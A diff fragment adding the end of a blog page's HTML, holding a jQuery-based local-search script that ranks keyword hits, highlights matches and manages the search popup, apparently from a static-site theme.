+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
